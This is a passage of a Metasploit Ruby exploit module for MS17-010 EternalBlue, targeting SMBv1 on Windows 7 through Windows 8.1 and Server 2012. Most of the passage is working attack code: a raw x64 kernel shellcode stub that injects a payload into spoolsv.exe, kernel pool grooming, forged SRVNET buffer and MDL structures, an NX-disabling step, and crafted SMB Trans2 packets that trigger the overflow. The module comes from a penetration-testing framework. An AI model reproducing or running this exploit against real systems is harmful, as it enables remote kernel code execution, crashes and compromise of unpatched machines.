##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/smb1/packet'
require 'rubyntlm'
require 'windows_error'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Deprecated
  include Msf::Exploit::Remote::Tcp

  moved_from 'exploit/windows/smb/ms17_010_eternalblue_win8'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
        'Description' => %q{
          This module is a port of the Equation Group ETERNALBLUE exploit, part of
          the FuzzBunch toolkit released by Shadow Brokers.

          There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
          is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
          DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
          is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
          completed in srvnet!SrvNetWskReceiveComplete.

          This exploit, like the original may not trigger 100% of the time, and should be
          run continuously until triggered. It seems like the pool will get hot streaks
          and need a cool down period before the shells rain in again.

          The module will attempt to use Anonymous login, by default, to authenticate to perform the
          exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
          those instead.

          On some systems, this module may cause system instability and crashes, such as a BSOD or
          a reboot. This may be more likely with some payloads.
        },

        'Author' =>
          [
            # Original Exploit
            'Equation Group', # OG research and exploit
            'Shadow Brokers', # Hack and dump
            'sleepya',        # Research and PoC

            # Original win7 module
            'Sean Dillon <sean.dillon@risksense.com>', # @zerosum0x0
            'Dylan Davis <dylan.davis@risksense.com>', # @jennamagius
            'thelightcosine', # RubySMB refactor and Fallback Credential mode

            # Original win8 module
            'wvu',             # Babby's first external module
            'agalway-r7',      # External python module to internal ruby module (sorry wvu)
            'cdelafuente-r7',  # ruby_smb wizard
            'cdelafuente-r7', # kernel debugging wizard

            # Combining the two
            'agalway-r7' # am good at copy pasta
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            # Win 7
            ['MSB', 'MS17-010'],
            ['CVE', '2017-0143'],
            ['CVE', '2017-0144'],
            ['CVE', '2017-0145'],
            ['CVE', '2017-0146'],
            ['CVE', '2017-0147'],
            ['CVE', '2017-0148'],
            ['URL', 'https://github.com/RiskSense-Ops/MS17-010'],
            ['URL', 'https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf'],

            # Win 8
            ['EDB', '42030'],
          ],
        'DefaultOptions' =>
          {
            'CheckModule' => 'auxiliary/scanner/smb/smb_ms17_010',
            'EXITFUNC' => 'thread',
            'WfsDelay' => 5
          },
        'Privileged' => true,
        'Platform' => 'win',
        'Arch' => [ARCH_X64],
        'Payload' => {
          'Space' => 2000, # this can be more, needs to be recalculated
          'EncoderType' => Msf::Encoder::Type::Raw,
          'DisableNops' => true
        },
        'Targets' =>
          [
            [ 'Automatic Target', {} ],
            [
              'Windows 7',
              {
                'os_patterns' => ['Windows 7']
              }
            ],
            [
              'Windows Embedded Standard 7',
              {
                'os_patterns' => ['Windows Embedded Standard 7']
              }
            ],
            [
              'Windows Server 2008 R2',
              {
                'os_patterns' => ['Windows Server 2008 R2']
              }
            ],
            [
              'Windows 8',
              {
                'os_patterns' => ['Windows 8']
              }
            ],
            [
              'Windows 8.1',
              {
                'os_patterns' => ['Windows 8.1']
              }
            ],
            [
              'Windows Server 2012',
              {
                'os_patterns' => ['Windows Server 2012']
              }
            ],
            [
              'Windows 10 Pro',
              {
                'os_patterns' => ['Windows Pro Build']
              }
            ],
            [
              'Windows 10 Enterprise Evaluation',
              {
                'os_patterns' => ['Windows 10 Enterprise Evaluation Build']
              }
            ]
          ],
        'DefaultTarget' => 0,
        'Notes' =>
          {
            'AKA' => ['ETERNALBLUE']
          },
        'DisclosureDate' => '2017-03-14'
      )
    )

    register_options(
      [
        Opt::RHOSTS,
        Opt::RPORT(445),
        OptString.new('SMBUser', [false, '(Optional) The username to authenticate as', ''], fallbacks: ['USERNAME']),
        OptString.new('SMBPass', [false, '(Optional) The password for the specified username', ''], fallbacks: ['PASSWORD']),
        OptString.new('SMBDomain', [
          false,
          '(Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7,' \
            ' Windows Embedded Standard 7 target machines.',
          ''
        ]),
        OptBool.new('VERIFY_TARGET', [
          true,
          'Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded' \
            ' Standard 7 target machines.',
          true
        ]),
        OptBool.new('VERIFY_ARCH', [
          true,
          'Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7,' \
            ' Windows Embedded Standard 7 target machines.',
          true
        ])
      ]
    )
    register_advanced_options(
      [
        OptString.new('ProcessName', [true, 'Process to inject payload into.', 'spoolsv.exe']),
        OptInt.new('GroomAllocations', [true, 'Initial number of times to groom the kernel pool.', 12]),
        OptInt.new('MaxExploitAttempts', [
          true,
          'The number of times to retry the exploit. Useful as EternalBlue can sometimes require multiple attempts to' \
          ' get a successful execution.',
          3
        ]),
        OptInt.new('GroomDelta', [
          true,
          'The amount to increase the groom count by per try. Only affects Windows Server 2008 R2, Windows 7, Windows' \
            ' Embedded Standard 7 target machines.',
          5
        ])
      ]
    )
  end

  def generate_process_hash(process)
    [Rex::Text.ror13_hash(process + "\x00")].pack('l<')
  end

  # ring3 = user mode encoded payload
  # proc_name = process to inject APC into
  def make_kernel_user_payload(ring3, proc_name)
    proc_hash = generate_process_hash(proc_name)

    sc = (
      "\x55\xe8\x2e\x00\x00\x00\xb9\x82\x00\x00\xc0\x0f\x32\x4c\x8d" \
      "\x0d\x34\x00\x00\x00\x44\x39\xc8\x74\x19\x39\x45\x00\x74\x0a" \
      "\x89\x55\x04\x89\x45\x00\xc6\x45\xf8\x00\x49\x91\x50\x5a\x48" \
      "\xc1\xea\x20\x0f\x30\x5d\xc3\x48\x8d\x2d\x00\x10\x00\x00\x48" \
      "\xc1\xed\x0c\x48\xc1\xe5\x0c\x48\x83\xed\x70\xc3\x0f\x01\xf8" \
      "\x65\x48\x89\x24\x25\x10\x00\x00\x00\x65\x48\x8b\x24\x25\xa8" \
      "\x01\x00\x00\x6a\x2b\x65\xff\x34\x25\x10\x00\x00\x00\x50\x50" \
      "\x55\xe8\xc5\xff\xff\xff\x48\x8b\x45\x00\x48\x83\xc0\x1f\x48" \
      "\x89\x44\x24\x10\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x31" \
      "\xc0\xb2\x01\xf0\x0f\xb0\x55\xf8\x75\x14\xb9\x82\x00\x00\xc0" \
      "\x8b\x45\x00\x8b\x55\x04\x0f\x30\xfb\xe8\x0e\x00\x00\x00\xfa" \
      "\x41\x5b\x41\x5a\x41\x59\x41\x58\x5a\x59\x5d\x58\xc3\x41\x57" \
      "\x41\x56\x57\x56\x53\x50\x4c\x8b\x7d\x00\x49\xc1\xef\x0c\x49" \
      "\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x66\x41\x81\x3f\x4d" \
      "\x5a\x75\xf1\x4c\x89\x7d\x08\x65\x4c\x8b\x34\x25\x88\x01\x00" \
      "\x00\xbf\x78\x7c\xf4\xdb\xe8\x01\x01\x00\x00\x48\x91\xbf\x3f" \
      "\x5f\x64\x77\xe8\xfc\x00\x00\x00\x8b\x40\x03\x89\xc3\x3d\x00" \
      "\x04\x00\x00\x72\x03\x83\xc0\x10\x48\x8d\x50\x28\x4c\x8d\x04" \
      "\x11\x4d\x89\xc1\x4d\x8b\x09\x4d\x39\xc8\x0f\x84\xc6\x00\x00" \
      "\x00\x4c\x89\xc8\x4c\x29\xf0\x48\x3d\x00\x07\x00\x00\x77\xe6" \
      "\x4d\x29\xce\xbf\xe1\x14\x01\x17\xe8\xbb\x00\x00\x00\x8b\x78" \
      "\x03\x83\xc7\x08\x48\x8d\x34\x19\xe8\xf4\x00\x00\x00\x3d" +
        proc_hash + "\x74\x10\x3d" + proc_hash + "\x74\x09\x48\x8b\x0c" \
      "\x39\x48\x29\xf9\xeb\xe0\xbf\x48\xb8\x18\xb8\xe8\x84\x00\x00" \
      "\x00\x48\x89\x45\xf0\x48\x8d\x34\x11\x48\x89\xf3\x48\x8b\x5b" \
      "\x08\x48\x39\xde\x74\xf7\x4a\x8d\x14\x33\xbf\x3e\x4c\xf8\xce" \
      "\xe8\x69\x00\x00\x00\x8b\x40\x03\x48\x83\x7c\x02\xf8\x00\x74" \
      "\xde\x48\x8d\x4d\x10\x4d\x31\xc0\x4c\x8d\x0d\xa9\x00\x00\x00" \
      "\x55\x6a\x01\x55\x41\x50\x48\x83\xec\x20\xbf\xc4\x5c\x19\x6d" \
      "\xe8\x35\x00\x00\x00\x48\x8d\x4d\x10\x4d\x31\xc9\xbf\x34\x46" \
      "\xcc\xaf\xe8\x24\x00\x00\x00\x48\x83\xc4\x40\x85\xc0\x74\xa3" \
      "\x48\x8b\x45\x20\x80\x78\x1a\x01\x74\x09\x48\x89\x00\x48\x89" \
      "\x40\x08\xeb\x90\x58\x5b\x5e\x5f\x41\x5e\x41\x5f\xc3\xe8\x02" \
      "\x00\x00\x00\xff\xe0\x53\x51\x56\x41\x8b\x47\x3c\x41\x8b\x84" \
      "\x07\x88\x00\x00\x00\x4c\x01\xf8\x50\x8b\x48\x18\x8b\x58\x20" \
      "\x4c\x01\xfb\xff\xc9\x8b\x34\x8b\x4c\x01\xfe\xe8\x1f\x00\x00" \
      "\x00\x39\xf8\x75\xef\x58\x8b\x58\x24\x4c\x01\xfb\x66\x8b\x0c" \
      "\x4b\x8b\x58\x1c\x4c\x01\xfb\x8b\x04\x8b\x4c\x01\xf8\x5e\x59" \
      "\x5b\xc3\x52\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x85\xc0\x75" \
      "\xf6\x92\x5a\xc3\x55\x53\x57\x56\x41\x57\x49\x8b\x28\x4c\x8b" \
      "\x7d\x08\x52\x5e\x4c\x89\xcb\x31\xc0\x44\x0f\x22\xc0\x48\x89" \
      "\x02\x89\xc1\x48\xf7\xd1\x49\x89\xc0\xb0\x40\x50\xc1\xe0\x06" \
      "\x50\x49\x89\x01\x48\x83\xec\x20\xbf\xea\x99\x6e\x57\xe8\x65" \
      "\xff\xff\xff\x48\x83\xc4\x30\x85\xc0\x75\x45\x48\x8b\x3e"     \
      "\x48\x8d\x35\x6a\x00\x00\x00" \
      "\xb9#{[ ring3.length ].pack('s')}\x00\x00" \
      "\xf3\xa4\x48\x8b" \
      "\x45\xf0\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x8b\x00\x66\x83" \
      "\x78\x48\x18\x75\xf6\x48\x8b\x50\x50\x81\x7a\x0c\x33\x00\x32" \
      "\x00\x75\xe9\x4c\x8b\x78\x20\xbf\x5e\x51\x5e\x83\xe8\x22\xff" \
      "\xff\xff\x48\x89\x03\x31\xc9\x88\x4d\xf8\xb1\x01\x44\x0f\x22" \
      "\xc1\x41\x5f\x5e\x5f\x5b\x5d\xc3\x48\x92\x31\xc9\x51\x51\x49" \
      "\x89\xc9\x4c\x8d\x05\x0d\x00\x00\x00\x89\xca\x48\x83\xec\x20" \
      "\xff\xd0\x48\x83\xc4\x30\xc3"
    )
    sc << ring3
    sc
  end

  def exploit
    check_code = check

    if check_code.code == 'vulnerable'
      print_good('The target is vulnerable.')
    else
      print_bad('The target is not vulnerable.')
    end

    if check_code.details[:arch] == ARCH_X86
      fail_with(Failure::NoTarget, 'This module only supports x64 (64-bit) targets')
    end

    if datastore['ForceExploit'] == 'true' || check_code.code == 'vulnerable'
      print_status('Forcing Exploit') if datastore['ForceExploit'] == 'true'

      os = Recog::Nizer.match('smb.native_os', check_code.details[:os])

      if os.nil?
        if target.name == 'Automatic Target'
          targs = ''
          targets[1..-1].each { |t| targs += "#{t.name}\n" }

          msg = "Could not determine victim OS. If the victim OS is one of the below options:\n"\
                "#{targs}"\
                "\nThen it can be selected manually with 'set TARGET <OS_NAME>'"
          fail_with(Failure::NoTarget, msg)
        else
          os = target.name
        end
      else
        os = os['os.product']
      end

      if os.start_with?('Windows 8', 'Windows 10', 'Windows Server 2012', 'Windows 2012')
        extend(EternalBlueWin8)
      else
        extend(EternalBlueWin7)
      end

      exploit_eb
    end
  end
end

module EternalBlueWin8
  MAX_SHELLCODE_SIZE = 3712

  # debug mode affects HAL heap. The 0xffffffffffd04000 address should be useable no matter what debug mode is.
  # The 0xffffffffffd00000 address should be useable when debug mode is not enabled
  # The 0xffffffffffd01000 address should be useable when debug mode is enabled
  TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000 # for put fake struct and shellcode

  # because the srvnet buffer is changed dramatically from Windows 7, I have to choose NTFEA size to 0x9000
  NTFEA_SIZE = 0x9000

  NTLM_FLAGS = Net::NTLM::FLAGS[:KEY56] +
               Net::NTLM::FLAGS[:KEY128] +
               Net::NTLM::FLAGS[:TARGET_INFO] +
               Net::NTLM::FLAGS[:NTLM2_KEY] +
               Net::NTLM::FLAGS[:NTLM] +
               Net::NTLM::FLAGS[:REQUEST_TARGET] +
               Net::NTLM::FLAGS[:UNICODE]

  NTFEA_9000 = (([0, 0, 0].pack('CCS<') + "\x00") * 0x260 + # with these fea, ntfea size is 0x1c80
    [0, 0, 0x735c].pack('CCS<') + "\x00" * 0x735d + # 0x8fe8 - 0x1c80 - 0xc = 0x735c
    [0, 0, 0x8147].pack('CCS<') + "\x00" * 0x8148) # overflow to SRVNET_BUFFER_HDR

  NTLM_CRYPT = Rex::Proto::NTLM::Crypt

  # fake struct for SrvNetWskTransformedReceiveComplete() and SrvNetCommonReceiveHandler()
  # x64: fake struct is at ffffffff ffd00e00
  #   offset 0x50:  KSPIN_LOCK
  #   offset 0x58:  LIST_ENTRY must be valid address. cannot be NULL.
  #   offset 0x110: array of pointer to function
  #   offset 0x13c: set to 3 (DWORD) for invoking ptr to function
  # some useful offset
  #   offset 0x120: arg1 when invoking ptr to function
  #   offset 0x128: arg2 when invoking ptr to function
  #
  # code path to get code exception after this struct is controlled
  # SrvNetWskTransformedReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
  def fake_recv_struct
    struct = "\x00" * 80
    struct << [0, TARGET_HAL_HEAP_ADDR + 0x58].pack('QQ<')
    struct << [TARGET_HAL_HEAP_ADDR + 0x58, 0].pack('QQ<')  # offset 0x60
    struct << ("\x00" * 16) * 10
    struct << [TARGET_HAL_HEAP_ADDR + 0x170, 0].pack('QQ<') # offset 0x110: fn_ptr array
    struct << [(0x8150 ^ 0xffffffffffffffff) + 1, 0].pack('QQ<') # set arg1 to -0x8150
    struct << [0, 0, 3].pack('QII<') # offset 0x130
    struct << ("\x00" * 16) * 3
    struct << [0, TARGET_HAL_HEAP_ADDR + 0x180].pack('QQ<') # shellcode address
    struct
  end

  def custom_smb_client
    sock = Rex::Socket::Tcp.create(
      'PeerHost' => rhost,
      'PeerPort' => rport,
      'Proxies' => proxies,
      'Context' => {
        'Msf' => framework,
        'MsfExploit' => self
      }
    )

    dispatcher = RubySMB::Dispatcher::Socket.new(sock)

    client = CustomSessionSetupPacketRubySMBClient.new(dispatcher, smb1: true, smb2: false, smb3: false,
                                                       username: smb_user, domain: smb_domain, password: smb_pass,
                                                       ntlm_flags: NTLM_FLAGS)

    return client, sock
  end

  def smb1_connect_ipc(negotiate_only: false, session_setup_packet: nil, session_setup_auth_packet: nil)
    begin
      client, sock = custom_smb_client

      if negotiate_only
        client.negotiate
        return client, nil, sock
      else
        response_code = client.login(ntlm_flags: NTLM_FLAGS,
                                     session_setup_packet: session_setup_packet,
                                     session_setup_auth_packet: session_setup_auth_packet)

        unless response_code == ::WindowsError::NTStatus::STATUS_SUCCESS
          raise RubySMB::Error::UnexpectedStatusCode, "Error with login: #{response_code}"
        end

        tree = client.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")
      end

      return client, tree, sock
    rescue StandardError => e
      print_error("Could not make SMBv1 connection. #{e.class} error raised with message '#{e.message}'")
      elog('Could not make SMBv1 connection', error: e)

      # for an as of yet undetermined reason, a connection can sometimes be created after an error during an anonymous
      # login.
      if client
        client.disconnect!
      end

      raise e
    end
  end

  def send_trans2_second(conn, tid, pid, data, displacement)
    pkt = RubySMB::SMB1::Packet::Trans2::RequestSecondary.new
    pkt.smb_header.tid = tid
    pkt.smb_header.pid_low = pid

    pkt.parameter_block.total_parameter_count = 0
    pkt.parameter_block.total_data_count = data.length

    fixed_offset = 32 + 3 + 18
    pkt.data_block.pad1 = ''

    pkt.parameter_block.parameter_count = 0
    pkt.parameter_block.parameter_offset = 0

    if !data.empty?
      pad_len = (4 - fixed_offset % 4) % 4

      if pad_len == 0
        pkt.data_block.pad1 = ''
      elsif pad_len == 3
        pkt.data_block.pad1 = "\x00" * 2
        pkt.data_block.pad1 = "\x00"
      else
        pkt.data_block.pad1 = "\x00" * pad_len
      end
    else
      pkt.data_block.pad1 = ''
      pad_len = 0
    end

    pkt.parameter_block.data_count = data.length
    pkt.parameter_block.data_offset = fixed_offset + pad_len
    pkt.parameter_block.data_displacement = displacement

    pkt.data_block.trans2_parameters = ''
    pkt.data_block.trans2_data = data

    pkt.smb_header.flags2.extended_security = 1
    pkt.smb_header.flags2.paging_io = 0
    pkt.smb_header.flags2.unicode = 0

    pkt.smb_header.uid = BinData::Bit16le.read(BinData::Bit16.new(2048).to_binary_s)

    conn.send_packet(pkt)
  end

  # connect to target and send a large nbss size with data 0x80 bytes
  # this method is for allocating big nonpaged pool on target
  def create_connection_with_big_smb_first_80(for_nx: false)
    sock = connect(false)
    pkt = "\x00".b + "\x00".b + [0x8100].pack('S>')
    # There is no need to be SMB2 because we want the target free the corrupted buffer.
    # Also this is invalid SMB2 message.
    # I believe NSA exploit use SMB2 for hiding alert from IDS
    # pkt += '\xfeSMB' # smb2
    # it can be anything even it is invalid
    pkt += "\x01\x02\x03\x04"

    if for_nx
      # MUST set no delay because 1 byte MUST be sent immediately
      sock.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
      pkt += "\x00" * 0x7b # another byte will be sent later to disabling NX
    else
      pkt += "\x00" * 0x7c
    end

    sock.send(pkt, 0)
    sock
  end

  def send_big_trans2(conn, tid, pid, setup, data, param)
    first_data_fragment_size = data.length % 4096

    pkt = RubySMB::SMB1::Packet::NtTrans::Request.new
    pkt.smb_header.tid = tid

    pkt.smb_header.pid_low = pid

    command = [setup].pack('S<')

    pkt.parameter_block.max_setup_count = 1
    pkt.parameter_block.max_parameter_count = param.length
    pkt.parameter_block.max_data_count = 0

    pkt.parameter_block.setup << 0x0000
    pkt.parameter_block.total_parameter_count = param.length
    pkt.parameter_block.total_data_count = data.length

    fixed_offset = 32 + 3 + 38 + command.length
    if !param.empty?
      pad_len = (4 - fixed_offset % 4) % 4
      pad_bytes = "\x00" * pad_len
      pkt.data_block.pad1 = pad_bytes
    else
      pkt.data_block.pad1 = ''
      pad_len = 0
    end

    pkt.parameter_block.parameter_count = param.length
    pkt.parameter_block.parameter_offset = fixed_offset + pad_len

    if !data.empty?
      pad_len = (4 - (fixed_offset + pad_len + param.length) % 4) % 4
      pkt.data_block.pad2 = "\x00" * pad_len
    else
      pkt.data_block.pad2 = ''
      pad_len = 0
    end

    pkt.parameter_block.data_count = first_data_fragment_size
    pkt.parameter_block.data_offset = pkt.parameter_block.parameter_offset + param.length + pad_len

    pkt.data_block.trans2_parameters = param
    pkt.data_block.trans2_data = data.first(first_data_fragment_size)

    pkt.smb_header.flags2.paging_io = 0
    pkt.smb_header.flags2.extended_security = 1

    begin
      recv_pkt = RubySMB::SMB1::Packet::NtTrans::Response.read(conn.send_recv(pkt))
    rescue RubySMB::Error::CommunicationError => e
      print_status('CommunicationError encountered. Have you set SMBUser/SMBPass?')
      raise e
    end

    if recv_pkt.status_code.value == 0
      print_good('got good NT Trans response')
    else
      print_error("got bad NT Trans response: #{recv_pkt.status_code.name}\n#{recv_pkt.status_code.description}")
      return nil
    end

    # Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
    size_of_data_to_be_sent = first_data_fragment_size
    while size_of_data_to_be_sent < data.length
      send_size = [4096, data.length - size_of_data_to_be_sent].min
      if data.length - size_of_data_to_be_sent <= 4096
        break
      end

      send_trans2_second(conn, tid, pid, data[size_of_data_to_be_sent...(size_of_data_to_be_sent + send_size)],
                         size_of_data_to_be_sent)
      size_of_data_to_be_sent += send_size
    end

    size_of_data_to_be_sent
  end

  def _exploit(fea_list, shellcode, num_groom_conn, username, password)
    session_setup_packet = default_session_setup_request
    session_setup_auth_packet = default_session_setup_request

    conn, tree, sock = smb1_connect_ipc(session_setup_packet: session_setup_packet,
                                        session_setup_auth_packet: session_setup_auth_packet)

    pid = conn.pid
    os = conn.peer_native_os
    print_status("Target OS: #{os}")

    if os.start_with?('Windows 10')
      build = os.split.last.to_i
      if build >= 14393 # version 1607
        print_status('This exploit does not support this build')
        return
      end
    elsif !(os.start_with?('Windows 8') || os.start_with?('Windows Server 2012'))
      print_status('This exploit does not support this target:')
      return
    end

    # The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
    # Send TRANS2_OPEN2 (0) with special fea_list to a target exce
    progress = send_big_trans2(conn, tree.id, pid, 0, fea_list, "\x00" * 30)
    if progress.nil?
      conn.disconnect!
      return
    end

    fea_list_nx = generate_fea_list_nx

    session_setup_packet = default_session_setup_request
    session_setup_packet.parameter_block.vc_number = 1

    session_setup_auth_packet = default_session_setup_request
    session_setup_auth_packet.parameter_block.max_mpx_count = 2
    session_setup_auth_packet.parameter_block.vc_number = 1

    nx_conn, nx_tree, nx_sock = smb1_connect_ipc(session_setup_packet: session_setup_packet,
                                                 session_setup_auth_packet: session_setup_auth_packet)

    # Another TRANS2_OPEN2 (0) with special fea_list for disabling NX
    nx_progress = send_big_trans2(nx_conn, nx_tree.id, pid, 0, fea_list_nx, "\x00" * 30)
    if nx_progress.nil?
      conn.disconnect!
      nx_conn.disconnect!
      return
    end

    # create some big buffer at servereternal
    # this buffer MUST NOT be big enough for overflown buffer
    alloc_conn, alloc_sock = create_session_alloc_non_paged(NTFEA_SIZE - 0x2010, username, password, pid)
    if alloc_conn.nil?
      return
    end

    # groom nonpaged pool
    # when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
    srvnet_conn = []
    num_groom_conn.times { srvnet_conn.append(create_connection_with_big_smb_first_80(for_nx: true)) }

    # create buffer size NTFEA_SIZE at server
    # this buffer will be replaced by overflown buffer
    hole_conn, hole_sock = create_session_alloc_non_paged(NTFEA_SIZE - 0x10, username, password, pid)
    if hole_conn.nil?
      return
    end

    # disconnect allocConn to free buffer
    # expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
    alloc_sock.close

    # hope one of srvnet_conn is next to holeConn
    5.times { srvnet_conn.append(create_connection_with_big_smb_first_80(for_nx: true)) }

    # remove holeConn to create hole for fea buffer
    hole_sock.close

    # send last fragment to create buffer in hole and OOB write one of srvnet_conn struct header
    # first trigger, overwrite srvnet buffer struct for disabling NX
    send_trans2_second(nx_conn, nx_tree.id, pid, fea_list_nx[nx_progress, fea_list_nx.length], nx_progress)

    recv_pkt = RubySMB::SMB1::Packet::Trans2::Response.read(nx_conn.recv_packet)
    if recv_pkt.status_code.value == 0xc000000d
      print_good('good response status for nx: INVALID_PARAMETER')
    else
      print_error("bad response status for nx: #{recv_pkt.status_code.value}")
    end

    # one of srvnet_conn struct header should be modified
    # send '\x00' to disable nx
    srvnet_conn.each { |sk| sk.send("\x00", 0) }

    # send last fragment to create buffer in hole and OOB write one of srvnet_conn struct header
    # second trigger, place fake struct and shellcode
    send_trans2_second(conn, tree.id, pid, fea_list[progress, fea_list.length], progress)
    recv_pkt = RubySMB::SMB1::Packet::Trans2::Response.read(conn.recv_packet)
    if recv_pkt.status_code.value == 0xc000000d
      print_good('good response status for nx: INVALID_PARAMETER')
    else
      print_error("bad response status for nx: #{recv_pkt.status_code.value}")
    end

    # one of srvnet_conn struct header should be modified
    # a corrupted buffer will write recv data in designed memory address
    srvnet_conn.each { |sk| sk.send(fake_recv_struct + shellcode, 0) }

    # execute shellcode, at this point the shellcode should be located at ffffffff`ffd04180
    srvnet_conn.each(&:close)

    nx_tree.disconnect!
    nx_conn.disconnect!

    tree.disconnect!
    conn.disconnect!
  end

  def create_fea_list(sc_size)
    fea_list = [0x10000].pack('I<')
    fea_list += NTFEA_9000
    fake_srv_net_buf = create_fake_srv_net_buffer(sc_size)
    fea_list += [0, 0, fake_srv_net_buf.length - 1].pack('CCS<') + fake_srv_net_buf # -1 because first '\x00' is for name
    # stop copying by invalid flag (can be any value except 0 and 0x80)
    fea_list += [0x12, 0x34, 0x5678].pack('CCS<')
    return fea_list
  end

  def create_fake_srv_net_buffer(sc_size)
    # 0x180 is size of fakeSrvNetBufferX64
    total_recv_size = 0x80 + 0x180 + sc_size
    fake_srv_net_buffer_x64 = "\x00" * 16
    fake_srv_net_buffer_x64 += [0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR].pack('SSIQ<') # flag, _, _, pNetRawBuffer
    fake_srv_net_buffer_x64 += [0, 0x82e8, 0].pack('QII<') # _, thisNonPagedPoolSize, _
    fake_srv_net_buffer_x64 += "\x00" * 16
    fake_srv_net_buffer_x64 += [0, total_recv_size].pack('QQ<') # offset 0x40
    fake_srv_net_buffer_x64 += [TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR].pack('Q<Q<') # pmdl2, pointer to fake struct
    fake_srv_net_buffer_x64 += [0, 0].pack('QQ<')
    fake_srv_net_buffer_x64 += "\x00" * 16
    fake_srv_net_buffer_x64 += "\x00" * 16
    fake_srv_net_buffer_x64 += [0, 0x60, 0x1004, 0].pack('QSSI<') # MDL.Next, MDL.Size, MDL.MdlFlags
    fake_srv_net_buffer_x64 += [0, TARGET_HAL_HEAP_ADDR - 0x80].pack('QQ<') # MDL.Process, MDL.MappedSystemVa

    return fake_srv_net_buffer_x64
  end

  def exploit_eb
    num_groom_conn = datastore['GroomAllocations'].to_i
    smbuser = datastore['SMBUser'].present? ? datastore['SMBUser'] : ''
    smbpass = datastore['SMBPass'].present? ? datastore['SMBPass'] : ''

    sc = make_kernel_user_payload(payload.encoded, datastore['ProcessName'])

    if sc.length > MAX_SHELLCODE_SIZE
      print_error("Shellcode too long. The place that this exploit put a shellcode is limited to #{MAX_SHELLCODE_SIZE} bytes.")
      return
    end

    fea_list = create_fea_list(sc.length)

    print_status("shellcode size: #{sc.length}")
    print_status("numGroomConn: #{num_groom_conn}")

    begin
      _exploit(fea_list, sc, num_groom_conn, smbuser, smbpass)
    rescue StandardError => e
      print_error("Exploit failed with the following error: #{e.message}")
      elog('Error encountered with eternalblue_win8', error: e)
      return false
    end
  end

  def create_session_alloc_non_paged(size, username, password, pid)
    # if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
    sess_pkt = SessionSetupSMB1RequestWithPoorlyFormedDataBlock.new

    anon_conn, _anon_tree, anon_sock = smb1_connect_ipc(negotiate_only: true)

    sess_pkt.smb_header.pid_low = pid

    if size >= 65535 # 0xffff
      sess_pkt.data_block.security_blob = [(size / 2).floor].pack('S<') + "\x00" * 20
      sess_pkt.smb_header.flags2.unicode = 0
    else
      sess_pkt.data_block.security_blob = [size].pack('S<') + "\x00" * 20
      sess_pkt.smb_header.flags2.unicode = 1
    end

    sess_pkt.smb_header.flags2.extended_security = 0
    sess_pkt.smb_header.flags2.nt_status = 1
    sess_pkt.smb_header.flags2.paging_io = 0

    sess_pkt.parameter_block.max_buffer_size = 61440 # can be any value greater than response size
    sess_pkt.parameter_block.max_mpx_count = 2 # can by any value
    sess_pkt.parameter_block.vc_number = 2 # any non-zero
    sess_pkt.parameter_block.session_key = 0
    sess_pkt.parameter_block.security_blob_length = 0 # this is OEMPasswordLen field in another format. 0 for NULL session

    sess_pkt.parameter_block.capabilities.each_pair do |k|
      if k == :nt_status || k == :extended_security
        sess_pkt.parameter_block.capabilities[k] = 1
      else
        sess_pkt.parameter_block.capabilities[k] = 0
      end
    end

    recv_pkt = RubySMB::SMB1::Packet::SessionSetupResponse.read(anon_conn.send_recv(sess_pkt))

    if recv_pkt.status_code.value == 0
      print_good('SMB1 session setup allocate nonpaged pool success')
      return anon_conn, anon_sock
    end

    anon_conn.disconnect!

    unless username.empty?
      # Try login with valid user because anonymous user might get access denied on Windows Server 2012
      # Note: If target allows only NTLMv2 authentication, the login will always fail.
      # support only ascii because I am lazy to implement Unicode (need pad for alignment and converting username to utf-16)
      req_size = (size / 2).floor

      neg_pkt = RubySMB::SMB1::Packet::NegotiateRequest.new
      neg_pkt.smb_header.flags2.extended_security = 0
      neg_pkt.add_dialect('NT LM 0.12')

      client, sock = custom_smb_client

      raw_response = client.send_recv(neg_pkt)
      response_packet = client.negotiate_response(raw_response)

      # parse_negotiate_response
      client.smb1 = true
      client.smb2 = false
      client.smb3 = false
      client.signing_required = response_packet.parameter_block.security_mode.security_signatures_required == 1
      client.dialect = response_packet.negotiated_dialect.to_s
      client.server_max_buffer_size = response_packet.parameter_block.max_buffer_size - 260
      client.negotiated_smb_version = 1
      client.session_encrypt_data = false
      client.server_guid = response_packet.data_block[:server_guid]

      server_challenge = response_packet.data_block.challenge

      sess_pkt.smb_header.pid_low = pid
      sess_pkt.smb_header.flags2.unicode = 0

      pwd_unicode = NTLM_CRYPT.ntlm_md4(password, server_challenge)

      sess_pkt.parameter_block.reserved = pwd_unicode.length
      sess_pkt.data_block.security_blob = [req_size + pwd_unicode.length + username.length].pack('S<') + pwd_unicode + username + ("\x00" * 16)

